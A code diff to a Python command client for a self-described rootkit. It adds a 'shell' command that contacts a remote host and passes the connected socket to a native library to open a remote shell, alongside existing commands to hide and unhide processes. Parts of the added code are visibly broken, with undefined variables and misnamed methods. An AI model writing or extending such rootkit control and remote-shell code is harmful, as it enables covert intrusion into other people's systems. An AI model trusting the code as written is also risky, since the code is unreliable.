@@ -5,13 +5,16 @@ from argparse import ArgumentParser
 from enum import Enum
 from threading import Condition, Thread
 from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as timeout_error
-
+from ctypes import cdll, create_string_buffer
 from typing import Dict, Optional
 
 JOB_ID_SIZE = 2
 REQUEST_PORT = 1111
 MAGIC = b'mrk'
 SOCK_TIMEOUT = 0.1
+
+SERVER_SO = Path(__file__).parent().parent() / 'usermode' / 'server.so'
+SERVER = cdll.LoadLibrary(SERVER_SO)
 
 
 class CommandType(Enum):
@@ -20,6 +23,11 @@ class CommandType(Enum):
     HIDE_PROCESS = b'hproc'
     UNHIDE_PROCESS = b'uproc'
     EXIT = b'fexit'
+    SHELL = b'shell'
+
+def _open_shell(socket: SocketType, prefix: bytes):
+    prefix_buff = create_string_buffer(prefix)
+    SERVER.start_server(socket.file_no(), prefix_buff)
 
 
 class Client:
@@ -51,6 +59,19 @@ class Client:
 
     def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
         return self.sendto(self._remote, command, argument, timeout=timeout)
+
+    def open_shell(self, *, timeout: Optional[float] = None):
+        assert self._thread.is_alive(), 'client must be started before sending'
+        # TODO: Switch to randbytes in python 3.9
+        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
+        # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
+        prefix = MAGIC + struct.pack('H', job_id)
+        self._sock.sendto(msg + CommandType.SHELL.value, (remote, REQUEST_PORT))
+        res = self._await_response(job_id, timeout)
+        if res:
+            return res
+        self._sock.connect((self._remote, REQUEST_PORT))
+        _open_shell(self._sock, prefix)
 
     def close(self):
         self._should_stop = True
@@ -89,6 +110,9 @@ def main():
     ns = parser.parse_args(sys.argv[1:])
     s = Client(ns.remote_ip)
     s.start()
+    if (ns.command_type == CommandType.SHELL):
+        s.open_shell(timeout=1)
+        return 0
     status = s.send(ns.command_type, ns.argument, timeout=1)
     s.close()
     if status is None:
